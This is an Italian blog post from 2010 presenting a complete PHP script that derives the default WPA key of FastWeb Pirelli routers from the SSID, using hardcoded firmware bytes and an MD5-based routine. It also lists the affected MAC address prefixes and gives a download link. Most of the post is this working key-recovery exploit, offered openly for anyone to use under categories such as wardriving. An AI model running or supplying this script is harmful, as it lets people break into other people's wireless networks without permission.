Date: 2010-06-05 06:18:13
Author: evilsocket
Categories: Exploiting, Hacking, PHP, Programmazione, Sorgenti, Wardriving
Tags: chiave, fastweb, hack, key, pirelli, ssid, telsey, warcracking, wifi, win32, wpa
Title: Script per il calcolo della chiave WPA dei router FastWeb Pirelli.

Oggi mi sono inbattuto per caso in <a href="http://www.oversecurity.net/wpa-recovery/" target="_blank">questo servizio</a>, ovvero un servizio per "recuperare" la chiave WPA di un router Fastweb Pirelli.

"Bene" mi sono detto, "Se hanno questo servizio, avranno anche una pagina dove spiegano l'algoritmo e pubblicano il codice" .

Beh, la <a href="http://www.oversecurity.net/2010/03/29/recupero-chiave-wpa-fastweb-dettagli-tecnici/" target="_blank">pagina</a> c'era, e non era nemmeno un loro lavoro bensì quello di un altro gruppo (vedere il link "fonte" alla fine di quell'articolo), ma non c'era il sorgente!

In pratica, queste persone, hanno preso il lavoro che altri hanno pubblicato <strong>liberamente e per tutti</strong>, lo hanno ri-pubblicato (citando la fonte eh, per carità), ne hanno ricavato un servizio (guarda caso un servizio che fa gola a molti su un sito con degli ads pubblicitari) ma non hanno condiviso a loro volta le conoscenze distribuendo il codice del servizio ... un po disonesto non vi pare?

Cioè, se io prendo un informazione libera, sono moralmente tenuto a rendere altrettanto libera qualsiasi opera io ne possa ricavare ... non legalmente, ma moralmente.

Ebbene, ci penso io con un mio script fresco fresco :D

<break>

Vi posto qui di seguito il codice di uno script PHP che, seguendo quell'algoritmo, parte dal SSID di un router e stampa la chiave WPA di default.

Ribadisco, come loro, che :

Attualmente è possibile recuperare la chiave Wireless degli Access Point <strong>FastWeb Pirelli</strong>, nello specifico con i seguenti Mac Address:
<blockquote><em>00:08:27 Pirelli Broadband Solutions
00:13:C8 </em><em>Pirelli Broadband Solutions</em>
<em>00:17:C2 Pirelli Broadband Solutions
00:19:3E P</em><em>irelli Broadband Solutions</em>
<em>00:1C:A2 </em><em>Pirelli Broadband Solutions</em>
<em>00:1D:8B </em><em>Pirelli Broadband Solutions</em>
<em>00:22:33 Pirelli Broadband Solutions
00:23:8E </em><em>Pirelli Broadband Solutions</em>
<em>00:25:53 </em><em>Pirelli Broadband Solutions</em>
<em>00:03:6F </em><em>Telsey S.p.A.</em><em> </em><em>(in fase di Test)
00:21:96 Telsey S.p.A.</em><em> (in fase di Test)</em></blockquote>
Detto questo, a breve pubblicherò uno script analogo ma per i router Alice, dato che stanno uscendo lavori anche in questo senso ;)

<pre><pre><code>  <?php
/***************************************************************************
 *   FastWeb Pirelli WPA Discovery                                         *
 *   by evilsocket - evilsocket@gmail.com - http://www.evilsocket.net      *
 *                                                                         *
 *   This program is free software; you can redistribute it and/or modify  *
 *   it under the terms of the GNU General Public License as published by  *
 *   the Free Software Foundation; either version 2 of the License, or     *
 *   (at your option) any later version.                                   *
 *                                                                         *
 *   This program is distributed in the hope that it will be useful,       *
 *   but WITHOUT ANY WARRANTY; without even the implied warranty of        *
 *   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the         *
 *   GNU General Public License for more details.                          *
 *                                                                         *
 *   You should have received a copy of the GNU General Public License     *
 *   along with this program; if not, write to the                         *
 *   Free Software Foundation, Inc.,                                       *
 *   59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.             *
 ***************************************************************************/

/*
 * SSID di partenza.
 */
$ssid   = "FASTWEB-1-00193EA1B2C3";
/*
 * 20 byte costanti cablati nel firmware dei Pirelli Fastweb.
 */
$seq_20 = "\x22\x33\x11\x34\x02\x81\xFA\x22\x11\x41\x68\x11\x12\x01\x05\x22\x71\x42\x10\x66";
/*
 * Prelevo la parte finale del SSID.
 */ 
$sn     = split( '-', $ssid );
$sn     = $sn[2];
/*
 * La divido in gruppi di due caratteri, formando un array
 * di 6 rappresentazioni esadecimali di byte.
 */
preg_match_all( "/[a-f0-9]{2}/i", $sn, $sn_bytes );
$sn_bytes = $sn_bytes[0];
/*
 * Inizializzo una stringa con il valore intero di questi byte.
 */
$str = "";
for( $i = 0; $i < 6; $i++ ){
    $str .= chr( hexdec( $sn_bytes[$i] ) );
}
echo "$str\n";


/* 
 * Aggiungo alla stringa i 20 byte "magici".
 */ 
$str .= $seq_20;
/*
 * Ricavo i byte dell'hash md5 della stringa
 */
preg_match_all( "/[a-f0-9]{2}/i", md5($str), $md5_bytes );
$md5_bytes = $md5_bytes[0];
$long      = "";
/*
 * Converto i byte in sequenze binarie di 8 bit.
 */
foreach( $md5_bytes as $byte ){
    $long .= sprintf( "%08s", decbin( hexdec($byte) ) );
}
/*
 * Divido in 5 gruppi di 5 bit ognuno e, qual'ora il valore intero 
 * di un gruppo sia maggiore di 0x0a, aggiungo 0x57.
 */
$hex_5 = array();
for( $i = 0; $i < 25; $i += 5 ){
    $n       = bindec( substr( $long, $i, 5 ) );
    $hex_5[] = $n > 0x0a ? $n + 0x57 : $n;
}
/*
 * Compongo la chiave.
 */ 
$wpa = "";
foreach( $hex_5 as $hex ){
    $wpa .= sprintf( "%02x", $hex );
}

print "WPA : $wpa\n";

?></pre></code></pre>

<strong><a href="http://sharecash.org/download.php?file=1279027" target="_blank">SCARICA SCRIPT</a></strong>
